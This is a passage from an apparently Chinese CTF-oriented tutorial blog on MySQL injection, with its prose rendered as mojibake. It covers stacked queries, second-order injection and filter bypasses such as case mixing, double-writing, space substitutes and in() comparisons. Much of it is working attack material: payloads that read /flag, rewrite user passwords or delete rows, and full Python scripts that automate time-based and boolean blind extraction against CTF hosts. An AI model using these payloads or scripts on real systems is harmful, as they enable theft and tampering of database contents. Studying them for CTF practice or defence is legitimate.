load_file(&#x27;</span>/flag<span class="string">&#x27;);--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># ä¿®æ”¹æ•°æ®è¡¨çš„ç»“æ„</span></span><br><span class="line"><span class="string">/?id=1&#x27;</span>;insert into <span class="built_in">users</span>(<span class="built_in">id</span>,username,password)values(20,<span class="string">&#x27;whoami&#x27;</span>,<span class="string">&#x27;657260&#x27;</span>);--+    <span class="comment"># æ’å…¥æ•°æ®</span></span><br><span class="line">/?<span class="built_in">id</span>=1<span class="string">&#x27;;update users set password=&#x27;</span>657260<span class="string">&#x27; where id&gt;0;--+    # æ›´æ”¹æ•°æ®</span></span><br><span class="line"><span class="string">/?id=1&#x27;</span>;delete from <span class="built_in">users</span> <span class="built_in">where</span> <span class="built_in">id</span>=20;--+    <span class="comment"># åˆ é™¤æ•°æ®</span></span><br><span class="line">/?<span class="built_in">id</span>=1<span class="string">&#x27;;create table fake_users like users;--+    # åˆ›å»ºä¸€ä¸ªæ–°è¡¨</span></span><br><span class="line"><span class="string">?id=1&#x27;</span>;rename table old_table to new_table;--+    <span class="comment"># æ›´æ”¹è¡¨å</span></span><br><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27;;alter table users change old_column new_column varchar(100);--+    # æ›´æ”¹å­—æ®µå</span></span><br></pre></td></tr></table></figure><p>ä¸‹é¢æ˜¯MySQLå †å æ³¨å…¥çš„å‡ ç§å¸¸è§å§¿åŠ¿ã€‚</p><p>rename ä¿®æ”¹è¡¨å</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27;;rename table words to words1;rename table flag_here to words;#</span></span><br><span class="line"><span class="string"># renameå‘½ä»¤ç”¨äºä¿®æ”¹è¡¨åã€‚</span></span><br><span class="line"><span class="string"># renameå‘½ä»¤æ ¼å¼ï¼šrename table åŸè¡¨å to æ–°è¡¨å;</span></span><br></pre></td></tr></table></figure><p>rename&#x2F;alter ä¿®æ”¹è¡¨åä¸å­—æ®µå</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27;;rename table words to words1;rename table flag_here to words;alter table words change flag id varchar(100);#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">renameå‘½ä»¤ç”¨äºä¿®æ”¹è¡¨åã€‚</span></span><br><span class="line"><span class="string">renameå‘½ä»¤æ ¼å¼ï¼šrename table åŸè¡¨å to æ–°è¡¨å;</span></span><br></pre></td></tr></table></figure><p>åˆ©ç”¨ HANDLER è¯­å¥<br>å¦‚æœrenameã€alterè¢«è¿‡æ»¤äº†ï¼Œæˆ‘ä»¬å¯ä»¥å€ŸåŠ©HANDLERè¯­å¥æ¥bypassã€‚åœ¨ä¸æ›´æ”¹è¡¨åçš„æƒ…å†µä¸‹è¯»å–å¦ä¸€ä¸ªè¡¨ä¸­çš„æ•°æ®ã€‚</p><p>HANDLER â€¦ OPEN è¯­å¥æ‰“å¼€ä¸€ä¸ªè¡¨ï¼Œä½¿å…¶å¯ä»¥ä½¿ç”¨åç»­ HANDLER â€¦ READ è¯­å¥è®¿é—®ï¼Œè¯¥è¡¨å¯¹è±¡æœªè¢«å…¶ä»–ä¼šè¯å…±äº«ï¼Œå¹¶ä¸”åœ¨ä¼šè¯è°ƒç”¨ HANDLER â€¦ CLOSE æˆ–ä¼šè¯ç»ˆæ­¢ä¹‹å‰ä¸ä¼šå…³é—­ï¼Œè¯¦æƒ…è¯·è§ï¼š<a href="https://www.cnblogs.com/taoyaostudy/p/13479367.html">https://www.cnblogs.com/taoyaostudy/p/13479367.html</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27;;HANDLER FlagHere OPEN;HANDLER FlagHere READ FIRST;HANDLER FlagHere CLOSE;#</span></span><br><span class="line"><span class="string">æˆ–</span></span><br><span class="line"><span class="string">1&#x27;</span>;HANDLER FlagHere OPEN;HANDLER FlagHere READ FIRST;<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>å †å æ³¨å…¥ä¸­çš„ç›²æ³¨<br>å †å æ³¨å…¥ä¸­çš„ç›²æ³¨å¾€å¾€æ˜¯æ’å…¥sqlè¯­å¥è¿›è¡Œå®è·µç›²æ³¨ï¼Œå°±æ¯”å¦‚ [SWPU2019]Web4 è¿™é“é¢˜ã€‚ç¼–å†™æ—¶é—´ç›²æ³¨è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#author: c1e4r</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment">#é¢˜ç›®åœ°å€</span></span><br><span class="line">    url = <span class="string">&#x27;&#x27;&#x27;http://568215bc-57ff-4663-a8d9-808ecfb00f7f.node3.buuoj.cn/index.php?r=Login/Login&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="comment">#æ³¨å…¥payload</span></span><br><span class="line">    payloads = <span class="string">&quot;asd&#x27;;set @a=0x&#123;0&#125;;prepare ctftest from @a;execute ctftest-- -&quot;</span></span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">        <span class="comment">#æŸ¥è¯¢payload</span></span><br><span class="line">        payload = <span class="string">&quot;select if(ascii(substr((select flag from flag),&#123;0&#125;,1))=&#123;1&#125;,sleep(3),1)&quot;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">128</span>):</span><br><span class="line">            <span class="comment">#å°†æ„é€ å¥½çš„payloadè¿›è¡Œ16è¿›åˆ¶è½¬ç å’Œjsonè½¬ç </span></span><br><span class="line">            datas = &#123;<span class="string">&#x27;username&#x27;</span>:payloads.<span class="built_in">format</span>(str_to_hex(payload.<span class="built_in">format</span>(i,j))),<span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;test213&#x27;</span>&#125;</span><br><span class="line">            data = json.dumps(datas)</span><br><span class="line">            times = time.time()</span><br><span class="line">            res = requests.post(url = url, data = data)</span><br><span class="line">            <span class="keyword">if</span> time.time() - times &gt;= <span class="number">3</span>:</span><br><span class="line">                flag = flag + <span class="built_in">chr</span>(j)</span><br><span class="line">                <span class="built_in">print</span>(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">str_to_hex</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">hex</span>(<span class="built_in">ord</span>(c)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>) <span class="keyword">for</span> c <span class="keyword">in</span> s])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¿˜æ¶‰åŠåˆ°äº†ä¸€äº›jsonçš„å†…å®¹ï¼Œjson.dumps() æ˜¯æŠŠpythonå¯¹è±¡è½¬æ¢æˆjsonå¯¹è±¡çš„ä¸€ä¸ªè¿‡ç¨‹ï¼Œç”Ÿæˆçš„æ˜¯å­—ç¬¦ä¸²ã€‚webæœåŠ¡ä¸­ä¼ è¾“ä¿¡æ¯çš„ä¸€ç§æ–¹å¼ã€‚</p><h2 id="äºŒæ¬¡æ³¨å…¥"><a href="#äºŒæ¬¡æ³¨å…¥" class="headerlink" title="äºŒæ¬¡æ³¨å…¥"></a>äºŒæ¬¡æ³¨å…¥</h2><p>äºŒæ¬¡æ³¨å…¥ç”¨åˆ°çš„SQLè¯­æ³•çŸ¥è¯†<br>é€šå¸¸äºŒæ¬¡æ³¨å…¥çš„æˆå› ä¼šæ˜¯æ’å…¥è¯­å¥ï¼Œæˆ‘ä»¬æ§åˆ¶è‡ªå·±æƒ³è¦æŸ¥è¯¢çš„è¯­å¥æ’å…¥åˆ°æ•°æ®åº“ä¸­å†å»æ‰¾ä¸€ä¸ªèƒ½æ˜¾ç¤ºæ’å…¥æ•°æ®çš„å›æ˜¾çš„åœ°æ–¹ï¼ˆå¯èƒ½æ˜¯ç™»é™†åçš„ç”¨æˆ·åç­‰ç­‰ã€ä¹Ÿæœ‰å¯èƒ½æ˜¯åˆ é™¤åæ˜¾ç¤ºåˆ é™¤å†…å®¹çš„åœ°æ–¹~ï¼‰ï¼Œæ¶æ„æ’å…¥æŸ¥è¯¢è¯­å¥çš„ç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">insert into <span class="built_in">users</span>(<span class="built_in">id</span>,username,password,email) values(1,<span class="string">&#x27;0&#x27;</span>+hex(database())+<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;0&#x27;</span>+hex(hex(user()))+<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;123@qq.com&#x27;</span>)</span><br><span class="line"></span><br><span class="line">insert into <span class="built_in">users</span>(<span class="built_in">id</span>,username,password,email) values(1,<span class="string">&#x27;0&#x27;</span>+substr((select hex(hex(select * from flag))),1,10)+<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>,<span class="string">&#x27;123@qq.com&#x27;</span>)</span><br></pre></td></tr></table></figure><p>éœ€è¦å¯¹åç«¯çš„SQLè¯­å¥æœ‰ä¸€ä¸ªçŒœæµ‹</p><p>è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªç‚¹ï¼Œæˆ‘ä»¬ä¸èƒ½ç›´æ¥å°†è¦æŸ¥è¯¢çš„å‡½æ•°æ’å…¥ï¼Œå› ä¸ºå¦‚æœç›´æ¥æ’å…¥çš„è¯ï¼Œâ€™database()â€™ä¼šè¢«è¯†åˆ«ä¸ºå­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬éœ€è¦æƒ³åŠæ³•é—­åˆå‰åå•å¼•å·çš„åŒæ—¶å°†æˆ‘ä»¬çš„æŸ¥è¯¢æ’å…¥ï¼Œå°±å‡ºç°äº†â€™0â€™+database()+â€™0â€™è¿™æ ·çš„æ„é€ ï¼Œä½†æ˜¯è¿™ä¸ªçš„å›æ˜¾æ˜¯0ï¼Œä½†æ˜¯åœ¨æˆ‘ä»¬è¿›è¡Œäº†hexç¼–ç ä¹‹åå°±èƒ½æ­£å¸¸çš„æŸ¥è¯¢äº†ï¼Œä¹Ÿå°±æ˜¯ä¸Šé¢å‡ºç°çš„â€™0â€™+hex(database())+â€™0â€™</p><h3 id="æ³¨å…¥æµç¨‹-3"><a href="#æ³¨å…¥æµç¨‹-3" class="headerlink" title="æ³¨å…¥æµç¨‹"></a>æ³¨å…¥æµç¨‹</h3><p>é¦–å…ˆæ‰¾åˆ°æ’å…¥ç‚¹ï¼Œé€šå¸¸æƒ…å†µä¸‹æ˜¯ä¸€ä¸ªæ³¨å†Œé¡µé¢ï¼Œregister.phpè¿™ç§ï¼Œå…ˆç®€å•çš„æŸ¥çœ‹ä¸€ä¸‹æ³¨å†Œåæœ‰æ²¡æœ‰ä»€ä¹ˆæ³¨å†Œæ—¶å†™å…¥çš„ä¿¡æ¯åœ¨ä¹‹ååˆå›æ˜¾çš„ï¼Œè‹¥æœ‰å›æ˜¾çŒœæµ‹ä¸ºäºŒæ¬¡æŸ¥è¯¢ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">insert into <span class="built_in">users</span>(<span class="built_in">id</span>,username,password,email) values(1,<span class="string">&#x27;0&#x27;</span>+hex(database())+<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;0&#x27;</span>+hex(hex(user()))+<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;123@qq.com&#x27;</span>)</span><br><span class="line"></span><br><span class="line">insert into <span class="built_in">users</span>(<span class="built_in">id</span>,username,password,email) values(1,<span class="string">&#x27;0&#x27;</span>+substr((select hex(hex(select * from flag))),1,10)+<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>,<span class="string">&#x27;123@qq.com&#x27;</span>)</span><br></pre></td></tr></table></figure><p>æ„é€ ç±»ä¼¼äºvaluesä¸­çš„å‚æ•°è¿›è¡Œæ³¨å†Œç­‰æ“ä½œï¼Œç„¶åè¿›è¡ŒæŸ¥çœ‹ï¼Œå°†hexç¼–ç è§£ç å³å¯ï¼Œå¯èƒ½ä¼šæœ‰å…¶ä»–çš„å…ˆé™åˆ¶ï¼Œæ¯”å¦‚è¶…è¿‡10ä½å°±ä¼šè½¬åŒ–ä¸ºç§‘å­¦è®¡æ•°æ³•ï¼Œæˆ‘ä»¬å°±éœ€è¦ä½¿ç”¨from forè¯­å¥æ¥è¿›è¡Œä¸€ä¸ªé™åˆ¶ï¼Œå¯ä»¥ç¼–å†™è„šæœ¬ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> re <span class="keyword">as</span> r</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">ch = string.ascii_lowercase+string.digits+<span class="string">&#x27;-&#125;&#x27;</span>+<span class="string">&#x27;&#123;&#x27;</span></span><br><span class="line"></span><br><span class="line">re = requests.session()</span><br><span class="line">url = <span class="string">&#x27;http://9a88c359-4f55-44e9-9332-4c635c486ef0.node3.buuoj.cn/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>(<span class="params">email,username</span>):</span><br><span class="line">    url1 = url+<span class="string">&#x27;register.php&#x27;</span></span><br><span class="line">    data = <span class="built_in">dict</span>(email = email, username = username,password = <span class="string">&#x27;123&#x27;</span>)</span><br><span class="line">    html = re.post(url1,data=data)</span><br><span class="line">    html.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">email</span>):</span><br><span class="line">    url2 = url+<span class="string">&#x27;login.php&#x27;</span></span><br><span class="line">    data = <span class="built_in">dict</span>(email = email,password = <span class="string">&#x27;123&#x27;</span>)</span><br><span class="line">    html = re.post(url2, data=data)</span><br><span class="line">    html.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">hex_flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">17</span>):</span><br><span class="line">    payload = <span class="string">&quot;0&#x27;+(select substr(hex(hex((select * from flag))) from &#123;&#125; for &#123;&#125;))+&#x27;0&quot;</span>.<span class="built_in">format</span>(<span class="built_in">int</span>(j)*<span class="number">10</span>+<span class="number">1</span>,<span class="number">10</span>)</span><br><span class="line">    email = <span class="string">&#x27;&#123;&#125;@qq.com&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(j)+<span class="string">&#x27;14&#x27;</span>)</span><br><span class="line">    html = register(email,payload)</span><br><span class="line">    <span class="comment"># print html.text</span></span><br><span class="line">    html = login(email)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = r.findall(<span class="string">r&#x27;&lt;span class=&quot;user-name&quot;&gt;(.*?)&lt;/span&gt;&#x27;</span>,html.text,r.S)</span><br><span class="line">        hex_flag += <span class="built_in">str</span>(res[<span class="number">0</span>]).strip()</span><br><span class="line">        <span class="built_in">print</span>(hex_flag)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>( hex_flag.decode(<span class="string">&#x27;hex&#x27;</span>).decode(<span class="string">&#x27;hex&#x27;</span>))</span><br></pre></td></tr></table></figure><h2 id="å¸¸è§ç»•è¿‡"><a href="#å¸¸è§ç»•è¿‡" class="headerlink" title="å¸¸è§ç»•è¿‡"></a>å¸¸è§ç»•è¿‡</h2><h3 id="ç»“å°¾æ³¨é‡Šç¬¦ç»•è¿‡"><a href="#ç»“å°¾æ³¨é‡Šç¬¦ç»•è¿‡" class="headerlink" title="ç»“å°¾æ³¨é‡Šç¬¦ç»•è¿‡"></a>ç»“å°¾æ³¨é‡Šç¬¦ç»•è¿‡</h3><p>Mysqlä¸­å¸¸è§çš„æ³¨é‡Šç¬¦</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ã€<span class="comment">#    %23    --+æˆ–-- -    ;%00</span></span><br></pre></td></tr></table></figure><p>å¦‚æœæ‰€æœ‰çš„æ³¨é‡Šç¬¦å…¨éƒ¨è¢«è¿‡æ»¤äº†ï¼ŒæŠŠæˆ‘ä»¬è¿˜å¯ä»¥å°è¯•ç›´æ¥ä½¿ç”¨å¼•å·è¿›è¡Œé—­åˆï¼Œè¿™ç§æ–¹æ³•å¾ˆå¥½ç”¨ã€‚</p><h3 id="å­—ç¬¦ä¸²å˜æ¢ç»•è¿‡"><a href="#å­—ç¬¦ä¸²å˜æ¢ç»•è¿‡" class="headerlink" title="å­—ç¬¦ä¸²å˜æ¢ç»•è¿‡"></a>å­—ç¬¦ä¸²å˜æ¢ç»•è¿‡</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å¤§å°å†™ç»•è¿‡</span></span><br><span class="line">-1<span class="string">&#x27; UnIoN SeLeCt 1,2,database()--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># åŒå†™ç»•è¿‡</span></span><br><span class="line"><span class="string">-1&#x27;</span> uniunionon selselectect 1,2,database()--+</span><br><span class="line"></span><br><span class="line"><span class="comment"># å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡</span></span><br><span class="line">1<span class="string">&#x27;;set @a=concat(&quot;sel&quot;,&quot;ect * from users&quot;);prepare sql from @a;execute sql;</span></span><br></pre></td></tr></table></figure><h3 id="è¿‡æ»¤-andã€or-ç»•è¿‡"><a href="#è¿‡æ»¤-andã€or-ç»•è¿‡" class="headerlink" title="è¿‡æ»¤ andã€or ç»•è¿‡"></a>è¿‡æ»¤ andã€or ç»•è¿‡</h3><p>ç®¡é“ç¬¦</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and =&gt; &amp;&amp;</span><br><span class="line">or =&gt; ||</span><br></pre></td></tr></table></figure><h3 id="ä½¿ç”¨-è¿›è¡Œå¼‚æˆ–ç›²æ³¨ç»•è¿‡"><a href="#ä½¿ç”¨-è¿›è¡Œå¼‚æˆ–ç›²æ³¨ç»•è¿‡" class="headerlink" title="ä½¿ç”¨^è¿›è¡Œå¼‚æˆ–ç›²æ³¨ç»•è¿‡"></a>ä½¿ç”¨^è¿›è¡Œå¼‚æˆ–ç›²æ³¨ç»•è¿‡</h3><p>å¼‚æˆ–è¿ç®—è§„åˆ™:<br>1^1&#x3D;0 0^0&#x3D;0 0^1&#x3D;1<br>1^1^1&#x3D;0 1^1^0&#x3D;0<br>æ„é€ payload:â€™^ascii(mid(database(),1,1)&#x3D;98)^0<br>æ³¨æ„è¿™é‡Œä¼šå¤šåŠ ä¸€ä¸ª^0æˆ–1æ˜¯å› ä¸ºåœ¨ç›²æ³¨çš„æ—¶å€™å¯èƒ½å‡ºç°äº†è¯­æ³•é”™è¯¯ä¹Ÿæ— æ³•åˆ¤æ–­,è€Œæ”¹å˜è¿™é‡Œçš„0æˆ–1,å¦‚æœè¿”å›çš„ç»“æœæ˜¯ä¸åŒçš„,é‚£å°±å¯ä»¥è¯æ˜è¯­æ³•æ˜¯æ²¡æœ‰é—®é¢˜çš„.</p><h3 id="è¿‡æ»¤ç©ºæ ¼ç»•è¿‡"><a href="#è¿‡æ»¤ç©ºæ ¼ç»•è¿‡" class="headerlink" title="è¿‡æ»¤ç©ºæ ¼ç»•è¿‡"></a>è¿‡æ»¤ç©ºæ ¼ç»•è¿‡</h3><p>ä»¥ä¸‹å­—ç¬¦å¯ä»¥ä»£æ›¿ç©ºæ ¼ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ä½¿ç”¨æ³¨é‡Šç¬¦/**/ä»£æ›¿ç©ºæ ¼:</span></span><br><span class="line">select/**/database();</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½¿ç”¨åŠ å·+ä»£æ›¿ç©ºæ ¼:(åªé€‚ç”¨äºGETæ–¹æ³•ä¸­)</span></span><br><span class="line">select+database();</span><br><span class="line"><span class="comment"># æ³¨æ„: åŠ å·+åœ¨URLä¸­ä½¿â½¤è®°å¾—ç¼–ç ä¸º%2B: select%2Bdatabase(); (pythonä¸­ä¸ç”¨)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½¿â½¤æ‹¬å·åµŒå¥—:</span></span><br><span class="line">select(group_concat(table_name))from(information_schema.taboles)<span class="built_in">where</span>(tabel_schema=database());</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½¿â½¤å…¶ä»–ä¸å¯â»…å­—ç¬¦ä»£æ›¿ç©ºæ ¼:</span></span><br><span class="line">%09, %0a, %0b, %0c, %0d, %a0</span><br><span class="line"></span><br><span class="line"><span class="comment">#åˆ©ç”¨``åˆ†éš”è¿›è¡Œç»•è¿‡</span></span><br><span class="line">select host,user from user <span class="built_in">where</span> user=<span class="string">&#x27;a&#x27;</span>union(select`table_name`,`table_type`from`information_schema`.`tables`);</span><br></pre></td></tr></table></figure><p>åŒæ—¶ä»»ç„¶å¯ä»¥åˆ©ç”¨å¼‚æˆ–ç¬¦å·è¿›è¡Œç›²æ³¨ï¼Œæˆ‘iä»¬å¯ä»¥çœ‹åˆ°ä¸Šé¢çš„payloadä¸­å®Œå…¨å¯ä»¥ä¸å­˜åœ¨ç©ºæ ¼ã€‚</p><h3 id="è¿‡æ»¤æ‹¬å·ç»•è¿‡"><a href="#è¿‡æ»¤æ‹¬å·ç»•è¿‡" class="headerlink" title="è¿‡æ»¤æ‹¬å·ç»•è¿‡"></a>è¿‡æ»¤æ‹¬å·ç»•è¿‡</h3><p>åˆ©ç”¨ order by è¿›è¡Œå¸ƒå°”ç›²æ³¨<br>ä¸Šé¢æœ‰</p><h3 id="è¿‡æ»¤æ¯”è¾ƒç¬¦å·ï¼ˆ-x3D-ã€-lt-ã€-gt-ï¼‰ç»•è¿‡"><a href="#è¿‡æ»¤æ¯”è¾ƒç¬¦å·ï¼ˆ-x3D-ã€-lt-ã€-gt-ï¼‰ç»•è¿‡" class="headerlink" title="è¿‡æ»¤æ¯”è¾ƒç¬¦å·ï¼ˆ&#x3D;ã€&lt;ã€&gt;ï¼‰ç»•è¿‡"></a>è¿‡æ»¤æ¯”è¾ƒç¬¦å·ï¼ˆ&#x3D;ã€&lt;ã€&gt;ï¼‰ç»•è¿‡</h3><p>æ¯”è¾ƒç¬¦å·ä¸€èˆ¬ä¹Ÿåªå‡ºç°åœ¨ç›²æ³¨ä¸­ï¼Œæ‰€ä»¥éƒ½å°½å¯èƒ½æ­é…äº†è„šæœ¬ã€‚</p><h3 id="ä½¿ç”¨-in-ç»•è¿‡"><a href="#ä½¿ç”¨-in-ç»•è¿‡" class="headerlink" title="ä½¿ç”¨ in() ç»•è¿‡"></a>ä½¿ç”¨ in() ç»•è¿‡</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/?<span class="built_in">id</span>=<span class="string">&#x27; or ascii(substr((select database()),1,1)) in(114)--+    // é”™è¯¯</span></span><br><span class="line"><span class="string">/?id=&#x27;</span> or ascii(substr((select database()),1,1)) <span class="keyword">in</span>(115)--+    // æ­£å¸¸å›æ˜¾</span><br><span class="line"></span><br><span class="line">/?<span class="built_in">id</span>=<span class="string">&#x27; or substr((select database()),1,1) in(&#x27;</span>s<span class="string">&#x27;)--+    // æ­£å¸¸å›æ˜¾</span></span><br></pre></td></tr></table></figure><p>ç»¼ä¸Šæ‰€è¿°ï¼Œå¾ˆæ˜æ˜¾å’Œæ™®é€šçš„å¸ƒå°”ç›²æ³¨å·®ä¸å¤šï¼Œäºæ˜¯å†™ä¸ªGETçš„äºŒåˆ†æ³•ç›²æ³¨è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://b8e2048e-3513-42ad-868d-44dbb1fba5ac.node3.buuoj.cn/Less-8/?id=&quot;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;&#x27; or ascii(substr((select database()),&#123;0&#125;,1)) in(&#123;1&#125;)--+&quot;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">37</span>,<span class="number">128</span>):</span><br><span class="line">            url = <span class="string">&quot;http://b8e2048e-3513-42ad-868d-44dbb1fba5ac.node3.buuoj.cn/Less-8/?id=&#x27; or ascii(substr((select database()),&#123;0&#125;,1)) in(&#123;1&#125;)--+&quot;</span>.<span class="built_in">format</span>(i,j)</span><br><span class="line">            r = requests.get(url=url)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;You are in&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                flag += <span class="built_in">chr</span>(j)</span><br><span class="line">                <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h3 id="LIKE-æ³¨å…¥"><a href="#LIKE-æ³¨å…¥" class="headerlink" title="LIKE æ³¨å…¥"></a>LIKE æ³¨å…¥</h3><p>åœ¨LIKEå­å¥ä¸­ï¼Œç™¾åˆ†æ¯”(%)é€šé…ç¬¦å…è®¸åŒ¹é…ä»»ä½•å­—ç¬¦ä¸²çš„é›¶ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ã€‚ä¸‹åˆ’çº¿ _ 